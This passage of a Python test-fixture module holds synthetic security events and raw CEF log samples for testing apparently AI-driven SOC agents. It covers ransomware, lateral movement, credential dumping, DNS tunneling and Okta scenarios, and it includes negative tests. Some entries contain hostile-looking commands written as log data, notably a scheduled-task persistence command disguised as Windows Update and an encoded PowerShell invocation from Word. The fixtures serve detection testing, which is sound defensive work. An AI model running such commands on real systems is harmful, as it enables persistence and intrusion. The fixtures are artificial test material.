        "service_account_rdp_baseline_hosts": 0,
        "technique": "T1021.001",
        "technique_name": "Remote Services: Remote Desktop Protocol",
        "test_case": "T-UBA-lateral_movement",
    },
}

TUBA_PRIVILEGE_ESCALATION_OKTA = {
    # UEBA test: Okta group membership change grants AWS admin outside change window
    "event_id": "OK-TUBA-004",
    "event_type": "privilege_escalation",
    "severity": "high",
    "timestamp": _ts(-7),
    "source_ip": "10.10.1.1",
    "user": "sre_oncall@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "product_version": "2025.02",
        "event_type": "group.user.membership.add",
        "outcome": "SUCCESS",
        "target_group": "AWS-Production-Admins",
        "target_user": "sre_oncall@corp.example",
        "actor": "svc_provisioning@corp.example",
        "change_window": False,
        "change_window_hours": "Tue/Thu 10:00-12:00 UTC",
        "current_time_utc": "03:44",
        "jira_ticket_linked": False,
        "test_case": "T-UBA-privilege_escalation",
    },
}

# ── T-CMP: CyphoraComplianceAgent ─────────────────────────────────────

TCMP_SCHEDULED_WEEKLY = {
    # Scheduled weekly compliance run
    "event_id": "SYS-TCMP-001",
    "event_type": "compliance_check",
    "severity": "low",
    "timestamp": _ts(0),
    "source_ip": "127.0.0.1",
    "user": "system",
    "source_host": "cyphora-scheduler",
    "raw_data": {
        "product": "cyphora_scheduler",
        "trigger": "weekly_schedule",
        "schedule": "every Monday 00:00 UTC",
        "frameworks": ["soc2", "iso27001", "pci_dss", "hipaa", "nis2"],
        "lookback_days": 90,
        "report_format": "pdf+json",
        "notify_on_completion": ["ciso@corp.example", "compliance@corp.example"],
        "test_case": "T-CMP-scheduled_weekly",
    },
}

TCMP_ON_DEMAND_PCI = {
    # On-demand PCI-DSS audit prep triggered by QSA request
    "event_id": "SYS-TCMP-002",
    "event_type": "compliance_check",
    "severity": "low",
    "timestamp": _ts(0),
    "source_ip": "10.0.0.1",
    "user": "compliance_officer@corp.example",
    "source_host": "cyphora-dashboard",
    "raw_data": {
        "product": "cyphora_dashboard",
        "trigger": "on_demand",
        "requested_by": "compliance_officer@corp.example",
        "reason": "QSA pre-audit review",
        "frameworks": ["pci_dss"],
        "lookback_days": 365,
        "include_evidence_artifacts": True,
        "test_case": "T-CMP-on_demand_pci",
    },
}

TCMP_HIPAA_BREACH_ASSESSMENT = {
    # HIPAA compliance check triggered after a potential breach event
    "event_id": "SYS-TCMP-003",
    "event_type": "compliance_check",
    "severity": "medium",
    "timestamp": _ts(0),
    "source_ip": "10.0.0.1",
    "user": "privacy_officer@corp.example",
    "source_host": "cyphora-dashboard",
    "raw_data": {
        "product": "cyphora_dashboard",
        "trigger": "breach_assessment",
        "frameworks": ["hipaa"],
        "lookback_days": 90,
        "related_incident_id": "INC-2025-0881",
        "phi_systems_in_scope": ["ehr-db-01", "imaging-srv-02", "patient-portal"],
        "breach_notification_window_days": 60,
        "test_case": "T-CMP-hipaa_breach",
    },
}

# ── T-NLQ: CyphoraNLQueryAgent — 10 sample NL queries ─────────────────

NL_QUERIES: List[Dict[str, Any]] = [
    {
        "event_id": "NLQ-001",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "analyst1@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "Show me all failed Okta logins from outside the US in the last 24 hours",
            "query_id": "NLQ-001",
            "requested_by": "analyst1@corp.example",
            "test_case": "T-NLQ-001",
        },
    },
    {
        "event_id": "NLQ-002",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "analyst1@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "Which CrowdStrike alerts with severity critical or high have not been resolved in the last 7 days?",
            "query_id": "NLQ-002",
            "test_case": "T-NLQ-002",
        },
    },
    {
        "event_id": "NLQ-003",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "analyst2@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "List every Palo Alto threat prevention block action against my finance subnet 10.20.0.0/16 this week",
            "query_id": "NLQ-003",
            "test_case": "T-NLQ-003",
        },
    },
    {
        "event_id": "NLQ-004",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "analyst2@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "Which users have logged into Okta from more than 3 different countries in the past 30 days?",
            "query_id": "NLQ-004",
            "test_case": "T-NLQ-004",
        },
    },
    {
        "event_id": "NLQ-005",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "soc_lead@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "Show all MITRE T1003 (credential dumping) detections from CrowdStrike in the past 48 hours with their associated usernames and hostnames",
            "query_id": "NLQ-005",
            "test_case": "T-NLQ-005",
        },
    },
    {
        "event_id": "NLQ-006",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "soc_lead@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "What are the top 10 external IPs that generated the most Palo Alto firewall alerts this month?",
            "query_id": "NLQ-006",
            "test_case": "T-NLQ-006",
        },
    },
    {
        "event_id": "NLQ-007",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "incident_handler@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "Give me a timeline of all events related to user mwilliams@corp.example in the last 8 hours across all sources",
            "query_id": "NLQ-007",
            "test_case": "T-NLQ-007",
        },
    },
    {
        "event_id": "NLQ-008",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "incident_handler@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "Are there any endpoints that CrowdStrike shows as having disabled tamper protection or having the sensor offline in the last hour?",
            "query_id": "NLQ-008",
            "test_case": "T-NLQ-008",
        },
    },
    {
        "event_id": "NLQ-009",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "compliance_officer@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "How many Okta MFA enrollment events happened in the last 90 days broken down by authentication method?",
            "query_id": "NLQ-009",
            "test_case": "T-NLQ-009",
        },
    },
    {
        "event_id": "NLQ-010",
        "event_type": "nl_query",
        "severity": "low",
        "timestamp": _ts(0),
        "source_ip": "10.0.0.1",
        "user": "ciso@corp.example",
        "source_host": "soc-dashboard",
        "raw_data": {
            "query": "Summarize all lateral movement detections from the last 7 days across CrowdStrike and Palo Alto, grouped by source host",
            "query_id": "NLQ-010",
            "test_case": "T-NLQ-010",
        },
    },
]

# ── T-NEG: Negative tests — benign events that should NOT fire investigations

TNEG_NORMAL_OKTA_LOGIN = {
    "event_id": "OK-TNEG-001",
    "event_type": "suspicious_login",  # type matches trigger, but data is benign
    "severity": "low",
    "timestamp": _ts(0),
    "source_ip": "192.168.1.10",
    "user": "regularuser@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "event_type": "user.authentication.sso",
        "outcome": "SUCCESS",
        "login_hour": 9,
        "day_of_week": "Monday",
        "new_device": False,
        "mfa_used": True,
        "mfa_method": "okta_verify_push",
        "client_geo_country": "US",
        "client_geo_city": "Austin",
        "okta_risk_score": 3,
        "risk_level": "LOW",
        "expected_result": "NO_ALERT — risk_score below threshold",
        "test_case": "T-NEG-normal_login",
    },
}

TNEG_ROUTINE_PATCH_SCAN_PAN = {
    "event_id": "PA-TNEG-002",
    "event_type": "anomaly_detected",
    "severity": "informational",
    "timestamp": _ts(0),
    "source_ip": "10.0.1.50",
    "user": "svc_patching@corp.example",
    "source_host": "PATCH-MGR-01",
    "raw_data": {
        "product": "paloalto_ngfw",
        "log_type": "TRAFFIC",
        "action": "allow",
        "application": "nessus",
        "rule_name": "Allow-Vuln-Scanning",
        "scheduled_scan": True,
        "scan_window_active": True,
        "maintenance_ticket": "CHG-2025-4421",
        "expected_result": "NO_ALERT — approved maintenance activity",
        "test_case": "T-NEG-routine_scan",
    },
}

TNEG_PLANNED_ADMIN_ESCALATION_OKTA = {
    "event_id": "OK-TNEG-003",
    "event_type": "privilege_escalation",
    "severity": "low",
    "timestamp": _ts(0),
    "source_ip": "10.10.1.15",
    "user": "it_admin@corp.example",
    "source_host": "okta-sso",
    "raw_data": {
        "product": "okta",
        "event_type": "user.account.privilege.grant",
        "outcome": "SUCCESS",
        "privilege_granted": "HELP_DESK_ADMIN",
        "actor_role": "ORG_ADMIN",
        "change_window": True,
        "jira_ticket": "IT-9823",
        "approved_by": "it_director@corp.example",
        "expected_result": "NO_ALERT — approved change with ticket",
        "test_case": "T-NEG-planned_escalation",
    },
}

# ══════════════════════════════════════════════════════════════════════════
# AGGREGATE COLLECTIONS
# ══════════════════════════════════════════════════════════════════════════

SCENARIOS: Dict[str, List[Dict[str, Any]]] = {
    "S1_RANSOMWARE": [
        S1_CROWDSTRIKE_MALICIOUS_MACRO,
        S1_PAN_C2_BEACON,
        S1_CROWDSTRIKE_LATERAL_PSEXEC,
        S1_CROWDSTRIKE_CREDENTIAL_DUMP,
        S1_CROWDSTRIKE_RANSOMWARE,
    ],
    "S2_INSIDER_EXFIL": [
        S2_OKTA_IMPOSSIBLE_TRAVEL,
        S2_OKTA_ADMIN_GRANT,
        S2_CROWDSTRIKE_DATA_STAGING,
        S2_PAN_EXFIL_UPLOAD,
    ],
    "S3_CREDENTIAL_LATERAL": [
        S3_OKTA_BRUTE_FORCE,
        S3_CROWDSTRIKE_LSASS_ACCESS,
        S3_PAN_SMB_SCAN,
        S3_CROWDSTRIKE_WMI_LATERAL,
    ],
    "S4_LOLBIN_DNS_TUNNEL": [
        S4_CROWDSTRIKE_LOLBIN,
        S4_CROWDSTRIKE_SCHEDULED_TASK,
        S4_PAN_DNS_TUNNEL,
    ],
    "S5_CLOUD_TAKEOVER": [
        S5_OKTA_CREDENTIAL_STUFFING,
        S5_PAN_CLOUD_API_ABUSE,
        S5_OKTA_SESSION_HIJACK,
    ],
}

AGENT_TARGETS: Dict[str, List[Dict[str, Any]]] = {
    "CyphoraInvestigationAgent": [
        # All 5 scenarios exercise InvestigationAgent
        *SCENARIOS["S1_RANSOMWARE"],
        *SCENARIOS["S2_INSIDER_EXFIL"],
        *SCENARIOS["S3_CREDENTIAL_LATERAL"],
        *SCENARIOS["S4_LOLBIN_DNS_TUNNEL"],
        *SCENARIOS["S5_CLOUD_TAKEOVER"],
        # Explicit individual trigger tests
        TINV_SUSPICIOUS_LOGIN_CROWDSTRIKE,
        TINV_ANOMALY_DETECTED_PALOALTO,
        TINV_CONFIRMED_ATTACK_OKTA,
        TINV_UEBA_ANOMALY_SYNTHETIC,
    ],
    "CyphoraUEBAAgent": [
        TUBA_SUSPICIOUS_LOGIN_OKTA,
        TUBA_DATA_EXFIL_PAN,
        TUBA_LATERAL_MOVEMENT_CS,
        TUBA_PRIVILEGE_ESCALATION_OKTA,
        # S2 and S3 also exercise UEBA
        S2_OKTA_IMPOSSIBLE_TRAVEL,
        S3_OKTA_BRUTE_FORCE,
    ],
    "CyphoraComplianceAgent": [
        TCMP_SCHEDULED_WEEKLY,
        TCMP_ON_DEMAND_PCI,
        TCMP_HIPAA_BREACH_ASSESSMENT,
    ],
    "CyphoraNLQueryAgent": NL_QUERIES,
    "NEGATIVE_TESTS": [
        TNEG_NORMAL_OKTA_LOGIN,
        TNEG_ROUTINE_PATCH_SCAN_PAN,
        TNEG_PLANNED_ADMIN_ESCALATION_OKTA,
    ],
}

# Flat list of all non-NLQ, non-compliance events for bulk testing
ALL_EVENTS: List[Dict[str, Any]] = [
    event for events in SCENARIOS.values() for event in events
] + [
    TINV_SUSPICIOUS_LOGIN_CROWDSTRIKE,
    TINV_ANOMALY_DETECTED_PALOALTO,
    TINV_CONFIRMED_ATTACK_OKTA,
    TINV_UEBA_ANOMALY_SYNTHETIC,
    TUBA_SUSPICIOUS_LOGIN_OKTA,
    TUBA_DATA_EXFIL_PAN,
    TUBA_LATERAL_MOVEMENT_CS,
    TUBA_PRIVILEGE_ESCALATION_OKTA,
    *AGENT_TARGETS["CyphoraComplianceAgent"],
    *NL_QUERIES,
    TNEG_NORMAL_OKTA_LOGIN,
    TNEG_ROUTINE_PATCH_SCAN_PAN,
    TNEG_PLANNED_ADMIN_ESCALATION_OKTA,
]


# ── Convenience helpers ────────────────────────────────────────────────


def get_scenario(name: str) -> List[Dict[str, Any]]:
    """Return all events for a named scenario (e.g. 'S1_RANSOMWARE')."""
    return SCENARIOS[name]


def get_events_for_agent(agent_class_name: str) -> List[Dict[str, Any]]:
    """Return events targeted at a specific Cyphora-S1 agent."""
    return AGENT_TARGETS.get(agent_class_name, [])


def get_events_by_severity(severity: str) -> List[Dict[str, Any]]:
    """Return all events matching the given severity level."""
    return [e for e in ALL_EVENTS if e.get("severity") == severity]


def get_events_by_product(product: str) -> List[Dict[str, Any]]:
    """
    Return all events whose raw_data.product starts with the given prefix.
    Examples: 'crowdstrike', 'okta', 'paloalto'
    """
    return [
        e
        for e in ALL_EVENTS
        if str(e.get("raw_data", {}).get("product", "")).startswith(product)
    ]


def get_scenario_kill_chain(scenario_name: str) -> List[Dict[str, Any]]:
    """Return scenario events sorted by scenario_step for kill-chain replay."""
    events = SCENARIOS.get(scenario_name, [])
    return sorted(
        events,
        key=lambda e: e.get("raw_data", {}).get("scenario_step", 99),
    )


# ══════════════════════════════════════════════════════════════════════════
# CEF-SOURCED TEST EVENTS (T-CEF)
# These events are derived from real CEF log format and exercise the
# full cef_parser → cef_adapters → agent pipeline.
# ══════════════════════════════════════════════════════════════════════════

# Raw CEF strings exactly as they appear in the sample log file and PDF.
# Used to test CEFParser.parse_text() and SecurityEventFactory.from_text().
CEF_SAMPLE_CROWDSTRIKE = """\
CEF:0|CrowdStrike|FalconHost|6.45|DetectionSummaryEvent|Malware Detection|8|rt=1714589234000 dvchost=WIN-SERVER-01 dvc=10.50.22.15 suser=jsmith@company.com cs1Label=DetectId cs1=ldt:a1b2c3d4e5f6g7h8:12345678 cs2Label=Technique cs2=T1059.001 cs3Label=Tactic cs3=Execution cs4Label=Severity cs4=Critical cs5Label=FileName cs5=malicious_payload.exe cs6Label=FilePath cs6=C:\\Users\\jsmith\\Downloads\\malicious_payload.exe fileHash=sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 msg=Malware detected and quarantined src=10.50.22.15 dst=192.168.1.100 dport=443 outcome=blocked
CEF:0|CrowdStrike|FalconHost|6.45|ProcessRollup2|Suspicious PowerShell Execution|6|rt=1714589456000 dvchost=LAPTOP-HR-05 dvc=10.50.22.89 suser=mwilson@company.com cs1Label=CommandLine cs1=powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA cs2Label=ParentProcess cs2=WINWORD.EXE cs3Label=Technique cs3=T1059.001 cs4Label=Tactic cs4=Execution cs5Label=ProcessId cs5=4892 fileHash=sha256:908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53 msg=Encoded PowerShell command executed from Office application outcome=logged
CEF:0|CrowdStrike|FalconHost|6.45|NetworkConnectIP4|Connection to Known C2 Server|9|rt=1714589678000 dvchost=DESKTOP-DEV-12 dvc=10.50.23.45 suser=agarcia@company.com src=10.50.23.45 dst=185.220.101.42 dport=8080 proto=TCP cs1Label=ConnectionDirection cs1=outbound cs2Label=Technique cs2=T1071.001 cs3Label=Tactic cs3=Command and Control cs4Label=ProcessName cs4=chrome.exe cs5Label=ThreatIndicator cs5=Known Cobalt Strike C2 msg=Outbound connection to known command and control infrastructure outcome=blocked
CEF:0|CrowdStrike|FalconHost|6.45|UserLogon|Successful User Logon|3|rt=1714589890000 dvchost=WIN-DC-01 dvc=10.50.1.10 suser=admin@company.com src=10.50.22.134 cs1Label=LogonType cs1=RemoteInteractive cs2Label=AuthenticationPackage cs2=Kerberos cs3Label=SessionId cs3=456789 msg=Successful remote desktop logon outcome=success
CEF:0|CrowdStrike|FalconHost|6.45|DetectionSummaryEvent|Lateral Movement via PsExec|9|rt=1714590010000 dvchost=WIN-DC-01 dvc=10.50.1.10 suser=admin@company.com src=10.50.22.89 dst=10.50.1.10 cs1Label=DetectId cs1=ldt:b2c3d4e5f6g7h8i9:23456789 cs2Label=Technique cs2=T1021.002 cs3Label=Tactic cs3=Lateral Movement cs4Label=Severity cs4=Critical cs5Label=FileName cs5=psexec.exe msg=PsExec lateral movement detected outcome=alerted
CEF:0|CrowdStrike|FalconHost|6.45|ProcessRollup2|Suspicious Scheduled Task Creation|7|rt=1714590090000 dvchost=WIN-SERVER-01 dvc=10.50.22.15 suser=jsmith@company.com cs1Label=CommandLine cs1=schtasks /create /tn "\\Microsoft\\Windows\\WinUpdate" /tr "C:\\Windows\\Temp\\svc32.exe" /sc ONLOGON /ru SYSTEM /f cs2Label=ParentProcess cs2=cmd.exe cs3Label=Technique cs3=T1053.005 cs4Label=Tactic cs4=Persistence cs5Label=ProcessId cs5=6104 msg=Suspicious scheduled task created masquerading as Windows Update outcome=alerted
"""

CEF_SAMPLE_CORTEX_XDR = """\
CEF:0|Palo Alto Networks|Cortex XDR|3.4|alert|Ransomware Encryption Activity Detected|10|rt=1714590123000 dvchost=FILESERVER-02 dvc=10.60.10.25 suser=SYSTEM cs1Label=AlertId cs1=12345 cs2Label=Severity cs2=high cs3Label=Category cs3=Malware cs4Label=Description cs4=Multiple file encryption operations detected matching ransomware behavior cs5Label=MitreTactic cs5=Impact cs6Label=MitreTechnique cs6=T1486 fileHash=sha256:d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2 fname=encrypted_file.locked fsize=2048576 msg=Ransomware behavior detected - mass file encryption outcome=alerted
CEF:0|Palo Alto Networks|Cortex XDR|3.4|prevention|Exploit Prevention - Buffer Overflow|8|rt=1714590345000 dvchost=WORKSTATION-15 dvc=10.60.15.88 suser=rdavis@company.com src=10.60.15.88 dst=203.0.113.50 dport=80 cs1Label=PreventionModule cs1=Exploit Protection cs2Label=ThreatName cs2=Generic Buffer Overflow Attempt cs3Label=MitreTechnique cs3=T1203 cs4Label=ApplicationName cs4=iexplore.exe cs5Label=Action cs5=blocked msg=Buffer overflow exploit attempt blocked outcome=blocked
CEF:0|Palo Alto Networks|Cortex XDR|3.4|network|DNS Tunneling Detected|7|rt=1714590567000 dvchost=LAPTOP-SALES-09 dvc=10.60.20.45 suser=tkhan@company.com src=10.60.20.45 dst=8.8.8.8 dport=53 proto=UDP cs1Label=ThreatType cs1=DNS Tunneling cs2Label=Domain cs2=a1b2c3d4e5f6.malicioustunnel.com cs3Label=MitreTactic cs3=Exfiltration cs4Label=MitreTechnique cs4=T1048.003 cs5Label=QueryCount cs5=847 msg=Abnormal DNS query pattern indicates potential data exfiltration outcome=alerted
CEF:0|Palo Alto Networks|Cortex XDR|3.4|bioc|Credential Dumping Detected|9|rt=1714590789000 dvchost=APP-SERVER-03 dvc=10.60.30.67 suser=service_account@company.com cs1Label=BehaviorIndicator cs1=LSASS Memory Access cs2Label=ProcessName cs2=mimikatz.exe cs3Label=MitreTactic cs3=Credential Access cs4Label=MitreTechnique cs4=T1003.001 cs5Label=ConfidenceScore cs5=95 fileHash=sha256:a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1 msg=LSASS process memory access detected - potential credential theft outcome=blocked
CEF:0|Palo Alto Networks|Cortex XDR|3.4|bioc|WMI Lateral Movement|9|rt=1714590850000 dvchost=APP-SERVER-03 dvc=10.60.30.67 suser=service_account@company.com src=10.60.30.67 dst=10.60.30.99 cs1Label=AlertId cs1=12346 cs2Label=ProcessName cs2=WmiPrvSE.exe cs3Label=MitreTactic cs3=Lateral Movement cs4Label=MitreTechnique cs4=T1047 cs5Label=ConfidenceScore cs5=88 msg=WMI remote execution to target host - lateral movement indicator outcome=alerted
"""

CEF_SAMPLE_OKTA = """\
CEF:0|Okta|Okta|2023.11|user.session.start|User Authentication Success|3|rt=1714591012000 suser=jdoe@company.com src=203.0.113.100 cs1Label=SessionId cs1=trs8KvP9qKLx7QbqYB7sK9wXY cs2Label=AuthenticationMethod cs2=PASSWORD cs3Label=DeviceType cs3=Computer cs4Label=Browser cs4=Chrome cs5Label=OS cs5=Windows 10 cs6Label=EventType cs6=user.session.start requestClientApplication=Okta Dashboard msg=User successfully authenticated outcome=success
CEF:0|Okta|Okta|2023.11|user.session.start|User Authentication Failed|5|rt=1714591234000 suser=admin@company.com src=198.51.100.45 cs1Label=Reason cs1=INVALID_CREDENTIALS cs2Label=AuthenticationMethod cs2=PASSWORD cs3Label=DeviceType cs3=Computer cs4Label=Browser cs4=Firefox cs5Label=FailureCount cs5=3 cs6Label=EventType cs6=user.session.start requestClientApplication=Office 365 msg=Authentication failed - invalid password attempt outcome=failure
CEF:0|Okta|Okta|2023.11|user.authentication.auth_via_mfa|MFA Challenge Success|4|rt=1714591456000 suser=bsmith@company.com src=192.0.2.78 cs1Label=FactorType cs1=token:software:totp cs2Label=Provider cs2=OKTA cs3Label=DeviceType cs3=Mobile cs4Label=EventType cs4=user.authentication.auth_via_mfa cs5Label=SessionId cs5=abc123xyz789def456 msg=Multi-factor authentication successful using TOTP outcome=success
CEF:0|Okta|Okta|2023.11|application.user_membership.add|User Added to Application|3|rt=1714591678000 suser=hwilliams@company.com duser=mjohnson@company.com cs1Label=ApplicationName cs1=Salesforce cs2Label=ApplicationId cs2=0oa1b2c3d4e5f6g7h8i9 cs3Label=EventType cs3=application.user_membership.add cs4Label=Actor cs4=hwilliams@company.com cs5Label=Target cs5=mjohnson@company.com msg=User mjohnson@company.com added to Salesforce application outcome=success
CEF:0|Okta|Okta|2023.11|user.account.lock|User Account Locked Due to Suspicious Activity|7|rt=1714591890000 suser=suspicious_user@company.com src=185.220.101.35 cs1Label=Reason cs1=MULTIPLE_FAILED_ATTEMPTS cs2Label=EventType cs2=user.account.lock cs3Label=FailedAttempts cs3=10 cs4Label=TimeWindow cs4=300 cs5Label=GeoLocation cs5=Unknown Country cs6Label=ThreatLevel cs6=high msg=Account locked after 10 failed login attempts from suspicious IP outcome=failure
CEF:0|Okta|Okta|2023.11|user.account.reset_password|User Password Reset|4|rt=1714592012000 suser=lthompson@company.com src=203.0.113.150 cs1Label=EventType cs1=user.account.reset_password cs2Label=ResetMethod cs2=EMAIL cs3Label=InitiatedBy cs3=User cs4Label=DeviceType cs4=Computer msg=User successfully reset password via email link outcome=success
"""

# Combined mixed-vendor CEF string (all three vendors in one stream)
CEF_SAMPLE_MIXED = CEF_SAMPLE_CROWDSTRIKE + CEF_SAMPLE_CORTEX_XDR + CEF_SAMPLE_OKTA


# ── CEF unit test events (T-CEF) — exercise cef_parser individually ──


def _make_cef_event(
    event_id: str,
    event_type: str,
    severity: str,
    source_host: str,
    source_ip: str,
    user: str,
    product: str,
    cef_class: str,
    cef_name: str,
    technique: str,
    tactic: str,
    msg: str,
    outcome: str,
    extra_raw: Optional[Dict[str, Any]] = None,
    test_case: str = "",
) -> Dict[str, Any]:
    """Build a SecurityEvent dict pre-populated with CEF-sourced raw_data."""
    raw: Dict[str, Any] = {
        "product": product,
        "source": f"cef_{product}",
        "cef_event_class": cef_class,
        "cef_event_name": cef_name,
        "Technique": technique,
        "Tactic": tactic,
        "msg": msg,
        "outcome": outcome,
        "test_case": test_case,
    }
    if extra_raw:
        raw.update(extra_raw)
    return {
        "event_id": event_id,
        "event_type": event_type,
        "severity": severity,
        "timestamp": _ts(0),
        "source_host": source_host,
        "source_ip": source_ip,
        "user": user,
        "raw_data": raw,
    }


# ── T-CEF-CS: CrowdStrike CEF events ───────────────────────────────────

TCEF_CS_MALWARE_DETECT = _make_cef_event(
    event_id="CEF-CS-001",
    event_type="abnormal_process_execution",
    severity="high",
    source_host="WIN-SERVER-01",
    source_ip="10.50.22.15",
    user="jsmith@company.com",
    product="crowdstrike",
    cef_class="detectionsummaryevent",
    cef_name="Malware Detection",
    technique="T1059.001",
    tactic="Execution",
    msg="Malware detected and quarantined",
    outcome="blocked",
    extra_raw={
        "DetectId": "ldt:a1b2c3d4e5f6g7h8:12345678",
        "Severity": "Critical",
        "FileName": "malicious_payload.exe",
        "FilePath": "C:\\Users\\jsmith\\Downloads\\malicious_payload.exe",
        "fileHash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "cef_severity": 8,
        "crowdstrike_sensor_id": "a1b2c3d4e5f6g7h8",
    },
    test_case="T-CEF-CS-malware_detection",
)

TCEF_CS_POWERSHELL = _make_cef_event(
    event_id="CEF-CS-002",
    event_type="abnormal_process_execution",
    severity="medium",
    source_host="LAPTOP-HR-05",
    source_ip="10.50.22.89",
    user="mwilson@company.com",
    product="crowdstrike",
    cef_class="processrollup2",
    cef_name="Suspicious PowerShell Execution",
    technique="T1059.001",
    tactic="Execution",
    msg="Encoded PowerShell command executed from Office application",
    outcome="logged",
    extra_raw={
        "CommandLine": "powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA",
        "ParentProcess": "WINWORD.EXE",
        "ProcessId": "4892",
        "fileHash": "sha256:908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53",
        "cef_severity": 6,
    },
    test_case="T-CEF-CS-powershell_from_office",
)

TCEF_CS_C2_NETWORK = _make_cef_event(
    event_id="CEF-CS-003",
    event_type="anomaly_detected",
    severity="critical",
    source_host="DESKTOP-DEV-12",
    source_ip="10.50.23.45",
    user="agarcia@company.com",
    product="crowdstrike",
    cef_class="networkconnectip4",
    cef_name="Connection to Known C2 Server",
    technique="T1071.001",
    tactic="Command and Control",
    msg="Outbound connection to known command and control infrastructure",
    outcome="blocked",
    extra_raw={
        "ConnectionDirection": "outbound",
        "ProcessName": "chrome.exe",
        "ThreatIndicator": "Known Cobalt Strike C2",
        "dst": "185.220.101.42",
        "dport": "8080",
        "proto": "TCP",
        "cef_severity": 9,
    },
    test_case="T-CEF-CS-c2_beacon",
)

TCEF_CS_PSEXEC_LATERAL = _make_cef_event(
    event_id="CEF-CS-004",
    event_type="lateral_movement",
    severity="critical",
    source_host="WIN-DC-01",
    source_ip="10.50.22.89",
    user="admin@company.com",
    product="crowdstrike",
    cef_class="detectionsummaryevent",
    cef_name="Lateral Movement via PsExec",
    technique="T1021.002",
    tactic="Lateral Movement",
    msg="PsExec lateral movement detected — service creation on remote host",
    outcome="alerted",
    extra_raw={
        "DetectId": "ldt:b2c3d4e5f6g7h8i9:23456789",
        "Severity": "Critical",
        "FileName": "psexec.exe",
        "dst": "10.50.1.10",
        "cef_severity": 9,
    },
    test_case="T-CEF-CS-psexec_lateral",
)

TCEF_CS_SCHEDULED_TASK = _make_cef_event(
    event_id="CEF-CS-005",
    event_type="abnormal_process_execution",
    severity="high",
    source_host="WIN-SERVER-01",
    source_ip="10.50.22.15",
    user="jsmith@company.com",
    product="crowdstrike",
    cef_class="processrollup2",
    cef_name="Suspicious Scheduled Task Creation",
    technique="T1053.005",
    tactic="Persistence",
    msg="Suspicious scheduled task created masquerading as Windows Update",
    outcome="alerted",
    extra_raw={
        "CommandLine": 'schtasks /create /tn "\\Microsoft\\Windows\\WinUpdate" /tr "C:\\Windows\\Temp\\svc32.exe" /sc ONLOGON /ru SYSTEM /f',
        "ParentProcess": "cmd.exe",
        "ProcessId": "6104",
        "cef_severity": 7,
    },
    test_case="T-CEF-CS-scheduled_task_persistence",
)

# ── T-CEF-PAN: Palo Alto Cortex XDR CEF events ─────────────────────────

TCEF_PAN_RANSOMWARE = _make_cef_event(
    event_id="CEF-PAN-001",
    event_type="abnormal_file_encryption",
    severity="critical",
    source_host="FILESERVER-02",
    source_ip="10.60.10.25",
    user="SYSTEM",
    product="paloalto",
    cef_class="alert",
    cef_name="Ransomware Encryption Activity Detected",
    technique="T1486",
    tactic="Impact",
    msg="Ransomware behavior detected - mass file encryption",
    outcome="alerted",
    extra_raw={
        "AlertId": "12345",
        "Category": "Malware",
        "Description": "Multiple file encryption operations detected matching ransomware behavior",
        "fileHash": "sha256:d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2",
        "fname": "encrypted_file.locked",
        "fsize": "2048576",
        "cef_severity": 10,
    },
    test_case="T-CEF-PAN-ransomware",
)

TCEF_PAN_BUFFER_OVERFLOW = _make_cef_event(
    event_id="CEF-PAN-002",
    event_type="abnormal_process_execution",
    severity="high",
    source_host="WORKSTATION-15",
    source_ip="10.60.15.88",
    user="rdavis@company.com",
    product="paloalto",
    cef_class="prevention",
    cef_name="Exploit Prevention - Buffer Overflow",
    technique="T1203",
    tactic="Execution",
    msg="Buffer overflow exploit attempt blocked",
    outcome="blocked",
    extra_raw={
        "PreventionModule": "Exploit Protection",
        "ThreatName": "Generic Buffer Overflow Attempt",
        "ApplicationName": "iexplore.exe",
        "Action": "blocked",
        "dst": "203.0.113.50",
        "dport": "80",
        "cef_severity": 8,
    },
    test_case="T-CEF-PAN-buffer_overflow",
)

TCEF_PAN_DNS_TUNNEL = _make_cef_event(
    event_id="CEF-PAN-003",
    event_type="data_exfiltration",
    severity="high",
    source_host="LAPTOP-SALES-09",
    source_ip="10.60.20.45",
    user="tkhan@company.com",
    product="paloalto",
    cef_class="network",
